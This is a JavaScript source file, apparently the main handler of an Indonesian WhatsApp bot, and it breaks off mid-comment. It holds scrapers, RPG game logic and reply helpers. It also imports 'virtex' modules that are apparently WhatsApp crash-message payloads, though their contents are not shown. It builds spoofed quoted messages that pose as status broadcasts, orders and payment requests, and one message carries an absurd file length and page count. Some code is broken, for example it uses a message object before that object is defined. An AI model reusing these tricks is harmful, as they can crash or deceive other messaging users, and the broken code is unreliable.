







require('./lib/menu')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, isJidBroadcast, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const scraper = require('@bochilteam/scraper');
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const speed = require('performance-now')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { generateProfilePicture } = require('./lib/myfunc')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const youtube = require("yt-search");
const ytdl = require("ytdl-core")
const dylux = require(`api-dylux`)
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./database/base/virtex/ngazap')
const { buttonkal } = require('./database/base/virtex/buttonkal')
const { cttl } = require('./database/base/virtex/cttl')
const { tizi } = require('./database/base/virtex/tizi')
const { weg } = require('./database/base/virtex/weg')
const ffstalk = require('./lib/scrape/ffstalk')
const { virtex7 } = require('./database/base/virtex/virtex7')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom,formatp, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const db_user = JSON.parse(fs.readFileSync('./database/base/user.json'))
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')
const { Client } = require('ssh2');



//=================================================/

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
    ...(global.db.data || {})
}
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));

const yts = require('./lib/scrape/yt-search')
const { ytSearch } = require('./lib/scrape/yt')
const { remini } = require('./database/base/remini.js')
const smenu = fs.readFileSync ('./database/base/image/simplemenu.jpg')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const { TelegraPH } = require("./lib/TelegraPH")
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
const antibott = JSON.parse(fs.readFileSync("./database/antibot.json"))
//======================FUNCTION=======================//
let m2 = "`"
const fakejpg = fs.readFileSync("./database/base/image/add.jpg")

async function avz(query) {
  const url = new URL('https://www.google.com/search');
  url.searchParams.append('q', query);
//avz
  const requestConfig = {
    method: 'GET',
    url: url.toString(),
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
  };
//avz
  const AvOsky = html => cheerio.load(html);
//avz
  const extractResults = ($, selector) => {
    const results = [];
    $(selector).each((_, element) => {
      const title = $(element).find('h3').text().trim();
      const link = $(element).find('a').attr('href');
      const snippet = $(element).find('.IsZvec').text().trim();

      if (title && link) {
        results.push({ title, link, snippet });
      }
    });
    return results;
  };
//avz
  try {
    const response = await axios(requestConfig);
    const $ = AvOsky(response.data);
    const results = extractResults($, 'div.g');

    return results;
  } catch (error) {
    console.error(`Error Dlu Tuan: ${error.message}`);
    return [];
  }
}
//avz
// cara gunakan 
avz('game seru')

const api = {
    xterm: {
        url: "https://ai.xterm.codes",
        key: "YoriChan"
    }
}; 


async function tiktok3(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (!res.size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				data.push({
					type: 'watermark',
					url: 'https://www.tikwm.com' + res.wmplay,
				}, {
					type: 'nowatermark',
					url: 'https://www.tikwm.com' + res.play,
				}, {
					type: 'nowatermark_hd',
					url: 'https://www.tikwm.com' + res.hdplay
				})
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}

async function snack(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const res = await fetch(url).then((v) => v.text());
      const $ = cheerio.load(res);
      const video = $("div.video-box").find("a-video-player");
      const author = $("div.author-info");
      const attr = $("div.action");
      const data = {
        title: $(author)
          .find("div.author-desc > span")
          .children("span")
          .eq(0)
          .text()
          .trim(),
        thumbnail: $(video)
          .parent()
          .siblings("div.background-mask")
          .children("img")
          .attr("src"),
        media: $(video).attr("src"),
        author: $("div.author-name").text().trim(),
        authorImage: $(attr).find("div.avatar > img").attr("src"),
        like: $(attr).find("div.common").eq(0).text().trim(),
        comment: $(attr).find("div.common").eq(1).text().trim(),
        share: $(attr).find("div.common").eq(2).text().trim(),
      };
      resolve(data);
    } catch (e) {
      reject(e);
    }
  });
}

async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
//========================================================================//
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah }= require('./src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('./src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay } = require('./src/monay.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, /*getLimit*/ } = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./src/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addDm, sellDm, getDm} = require('./database/base/rpg.js')
let DarahAwal =global.rpg.darahawal
const ikan = ['🐳','🐟','🐠']
//========================================================================//
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let hit = JSON.parse(fs.readFileSync('./src/total-hit-user.json'))

///


const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
//const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)



const banned = JSON.parse(fs.readFileSync('./database/base/dbnye/banned.json'))
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const isRegistered = checkRegisteredUser(m.sender)
virgam = fs.readFileSync(`./database/base/image/virgam.jpeg`)
//=================================================//
module.exports = conn = async (conn, m, chatUpdate, setting, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: conn.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}
     
     
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "#" : prefa ?? global.prefix

//=================================================//
//const isCmdAi = body.startsWith(prefixai)
const isCmd = body.startsWith(prefix)
const isCmd3 = body.startsWith('.')
const prefixai = /^[°•π÷×¶∆£¢€¥®™+✓_=|/~!?@#%^&.©^]/i.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|/~!?@#%^&.©^]/i)[0] : "#"
const isCmdAi = body.startsWith(prefixai)
const command =  isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '#' //Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase(), atau const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() ni all ya
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const isGroup = from.endsWith('@g.us');
const botNumber = await conn.decodeJid(conn.user.id)
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) :''
const prem = JSON.parse(fs.readFileSync('./database/base/dbnye/premium.json'))
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const antibot = m.isGroup ? antibott.includes(from) : false
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag ? mentionByTag : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'ᴘᴀɢɪ' ? dt + '🌄' : dt == 'sɪᴀɴɢ' ? dt + '🏜️' : dt == 'sᴏʀᴇ' ? dt + '🌇' : dt + '🌆'
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
const qtod = m.quoted? "true":"false"
const isPrem = prem.includes(m.sender)
//=================================================//
//═══════════════function ai═════════════════//


//═══════════════════batas══════════════════//
const cap = ownername
const yuk = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": smenu,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6285731947500\",\"product_id\":\"685731947500\",\"name\":\"krey\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}
//=================================================

// Auto Read
		/* (m.message) {
			console.log(chalk.black.bgWhite('[ PESAN ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ DARI ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
			if (settings.autoread) conn.readMessages([m.key]);
		}
     
     // Mengetik
		if (settings.autotype && isCmd) {
			await conn.sendPresenceUpdate('composing', m.chat)
            }*/
     
     
const kr = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

async function reply(txt) {
const RiooAjahhh = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `🔴 ${hariini} || ${botname} ʙʏ ᴅɪᴄʜxᴘʟᴏɪᴛ${m2}`,
newsletterJid: "120363310531380313@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: hariini,
thumbnailUrl: 'https://telegra.ph/file/cd7a6e114b09df25c6159.jpg',
sourceUrl: saluran,
},
},
text: txt,
}
return conn.sendMessage(m.chat, RiooAjahhh, {
quoted: m,
})
    }
     

const reply2 = (teks) => {
conn.sendMessage(m.chat, {
text: teks,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: true,
title: `Hᴀɪ ᴋᴀᴋ ${pushname}`,
body: `Selamat ${ucapanWaktu}`,
thumbnailUrl: 'https://telegra.ph/file/cd7a6e114b09df25c6159.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})}

const ZyReply = (teks) => {
    conn.sendMessage(m.chat, {
text: zyaa,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: true,
title: 'HORSETECH BY DICH',
body: '',
thumbnailUrl: 'https://telegra.ph/file/2f8541fc165fbbd2e8e8.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})}

const errorReply = (teks) => {
        return conn.sendMessage(from, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `krey`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: `Time: ${time}`,
                        previewType: "PHOTO",
                        thumbnail: add,
                        sourceUrl: yt                    }
                }}, {quoted: fkontak})}
     async function replyMsg(teks) {
            const prince = {
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `Akses Ditolak❌`,
                        body: ``,
                        previewType: "PHOTO",
                        thumbnail: add,
                        sourceUrl: ``
                    }
                },
                text: teks
            };
            return conn.sendMessage(m.chat, prince, {
                quoted: ftroli
            });
        };
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: add, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: add}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": gr,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': add}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": gr, "caption": `${pushname}`, 'jpegThumbnail': add}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": gr,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': add}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: gr,jpegThumbnail: add}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${global.ownername}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Ujang,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await conn.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

/*if (!m?.fromMe & !m?.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; 
let caption = `Hᴀʟᴏ @${m?.sender.split('@')[0]} ${ucapanWaktu}, ᴀᴅᴀ ᴀᴘᴀ ᴄʜᴀᴛ ᴏᴡɴᴇʀ *ɪᴛᴀᴄʜɪ - ᴍᴅ*, Jɪᴋᴀ ᴘᴇɴᴛɪɴɢ ᴛɪɴɢɢᴀʟᴋᴀɴ ᴄʜᴀᴛ ᴅᴀɴ *ɪᴛᴀᴄʜɪ - ᴍᴅ* ᴀᴋᴀɴ ᴍᴇᴍʙᴀʟᴀꜱ ꜱᴇᴄᴇᴘᴀᴛ ᴍᴜɴɢᴋɪɴ.`.trim();

conn.sendMessage(m?.chat, { 
text: caption, 
contextInfo: { 
forwardingScore: 10, 
isForwarded: true, 
mentionedJid: [m?.sender],
businessMessageForwardInfo: { 
businessOwnerJid: botNumber 
},
forwardedNewsletterMessageInfo: {
newsletterJid: 'bjir@newsletter',
serverMessageId: null,
newsletterName: "itachi"
}
}
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: "itachi Production Terverifikasi WhatsApp_"}}})
user.pc = new Date() * 1;
}
} catch (err) {
conn.sendMessage('6283852515748@s.whatsapp.net', { text: util.format(err) })
}
}*/
//=================================================
/**
 * Scraped By Kaviaann
 * Protected By MIT LICENSE
 * Whoever caught removing wm will be sued
 * @description Any Request? Contact me : vielynian@gmail.com
 * @author Kaviaann 2024
 * @copyright https://whatsapp.com/channel/0029Vac0YNgAjPXNKPXCvE2e
 */
async function snackVideo(url) {
  return new Promise(async (resolve, reject) => {
    try {
      if (!/snackvideo.com/gi.test(url)) return reject("Invalid URL!");
      const res = await fetch(url).then((v) => v.text());
      const $ = cheerio.load(res);
      const video = $("div.video-box").find("a-video-player");
      const author = $("div.author-info");
      const attr = $("div.action");
      const data = {
        title: $(author)
          .find("div.author-desc > span")
          .children("span")
          .eq(0)
          .text()
          .trim(),
        thumbnail: $(video)
          .parent()
          .siblings("div.background-mask")
          .children("img")
          .attr("src"),
        media: $(video).attr("src"),
        author: $("div.author-name").text().trim(),
        authorImage: $(attr).find("div.avatar > img").attr("src"),
        like: $(attr).find("div.common").eq(0).text().trim(),
        comment: $(attr).find("div.common").eq(1).text().trim(),
        share: $(attr).find("div.common").eq(2).text().trim(),
      };

      resolve(data);
    } catch (e) {
      reject(e);
    }
  });
}
  
   //  sengkrep snack by avosky.  //



async function snekVid(videoUrl) {
    try {
        const formData = new URLSearchParams({ id: videoUrl });
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        };
        const { data } = await axios.post('https://getsnackvideo.com/results', formData, { headers });
        const result = ParseData(data);
        return result;
    } catch (error) {
        return KaloError(error);
    }
}
// wm avs
function ParseData(html) {
    const $ = cheerio.load(html);
    const result = {
        status: 200,
        thumbnail: $('.img_thumb img').attr('src'),
        noWatermarkVideo: $('a.download_link.without_watermark').attr('href'),
    };
    if (!result.noWatermarkVideo) {
        return { status: 404, message: 'Video Gada' };
    }
    return result;
}
// wm avs
function KaloError(error) {
    console.error('Error Request:', error.message || error);
    return {
        status: error.response ? error.response.status : 500,
        message: error.message || 'Tetiba Error',
    };
}
// wm avs
snekVid('https://s.snackvideo.com/p/Ijr7ysPz')

//================batas≠=========================//
 /*if (db.data.users[m.sender].autolevelup) {
let user = global.db.data.users[m.sender]
if (!user.autolevelup) return !0
let before = user.level * 1
while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
if (user.level <= 1) {
user.role = 'Petualangan Awal 🌄'
} else if (user.level <= 11) {
user.role = 'Pertarungan Melawan Kegelapan 🗡️'
} else if (user.level <= 21) {
